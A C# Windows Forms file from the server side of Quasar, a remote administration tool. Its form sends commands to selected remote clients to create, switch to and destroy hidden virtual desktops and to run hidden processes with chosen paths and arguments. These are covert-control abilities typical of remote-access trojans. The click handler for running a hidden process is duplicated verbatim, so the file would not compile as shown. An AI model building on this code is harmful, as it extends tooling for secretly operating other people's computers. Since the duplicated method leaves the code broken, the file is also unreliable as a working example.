using Quasar.Common.Messages;
using Quasar.Server.Models;
using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace Quasar.Server.Forms
{
    public partial class FrmVirtualDesktop : Form
    {
        private readonly List<Client> _selectedClients;

        public FrmVirtualDesktop(List<Client> selectedClients)
        {
            _selectedClients = selectedClients;
            InitializeComponent();
            InitializeForm();
        }

        private void InitializeForm()
        {
            txtStationName.Text = "VirtualStation_" + DateTime.Now.ToString("yyyyMMdd_HHmmss");
            txtDesktopName.Text = "VirtualDesktop_" + DateTime.Now.ToString("yyyyMMdd_HHmmss");
            
            // Update client list
            lstClients.Items.Clear();
            foreach (var client in _selectedClients)
            {
                lstClients.Items.Add($"{client.EndPoint} - {client.UserName}");
            }
        }

        private void btnCreateVirtualDesktop_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(txtStationName.Text) || string.IsNullOrEmpty(txtDesktopName.Text))
            {
                MessageBox.Show("Please enter both Station Name and Desktop Name", "Validation Error", 
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            foreach (var client in _selectedClients)
            {
                try
                {
                    var message = new DoCreateVirtualDesktop
                    {
                        StationName = txtStationName.Text,
                        DesktopName = txtDesktopName.Text
                    };
                    client.Send(message);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error sending to {client.EndPoint}: {ex.Message}", "Error", 
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }

            MessageBox.Show("Virtual Desktop creation commands sent to selected clients", "Success", 
                MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void btnSwitchToVirtualDesktop_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(txtDesktopName.Text))
            {
                MessageBox.Show("Please enter Desktop Name", "Validation Error", 
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            foreach (var client in _selectedClients)
            {
                try
                {
                    var message = new DoSwitchToVirtualDesktop
                    {
                        DesktopName = txtDesktopName.Text
                    };
                    client.Send(message);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error sending to {client.EndPoint}: {ex.Message}", "Error", 
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }

            MessageBox.Show("Switch to Virtual Desktop commands sent to selected clients", "Success", 
                MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void btnDestroyVirtualDesktop_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(txtDesktopName.Text))
            {
                MessageBox.Show("Please enter Desktop Name", "Validation Error", 
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            if (MessageBox.Show("Are you sure you want to destroy the Virtual Desktop?", "Confirm Destruction", 
                MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                foreach (var client in _selectedClients)
                {
                    try
                    {
                        var message = new DoDestroyVirtualDesktop
                        {
                            DesktopName = txtDesktopName.Text
                        };
                        client.Send(message);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show($"Error sending to {client.EndPoint}: {ex.Message}", "Error", 
                            MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }

                MessageBox.Show("Virtual Desktop destruction commands sent to selected clients", "Success", 
                    MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void btnRunHiddenProcess_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(txtProcessPath.Text))
            {
                MessageBox.Show("Please enter Process Path", "Validation Error", 
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            foreach (var client in _selectedClients)
            {
                try
                {
                    var message = new DoRunHiddenProcess
                    {
                        FileName = txtProcessPath.Text,
                        Arguments = txtProcessArgs.Text
                    };
                    client.Send(message);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error sending to {client.EndPoint}: {ex.Message}", "Error", 
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }

            MessageBox.Show("Hidden process commands sent to selected clients", "Success", 
                MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void btnRunHiddenProcess_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(txtProcessPath.Text))
            {
                MessageBox.Show("Please enter Process Path", "Validation Error", 
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            foreach (var client in _selectedClients)
            {
                try
                {
                    var message = new DoRunHiddenProcess
                    {
                        FileName = txtProcessPath.Text,
                        Arguments = txtProcessArgs.Text
                    };
                    client.Send(message);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error sending to {client.EndPoint}: {ex.Message}", "Error", 
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }

            MessageBox.Show("Hidden process commands sent to selected clients", "Success", 
                MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void btnClose_Click(object sender, EventArgs e)
        {
            this.Close();
        }
    }
}
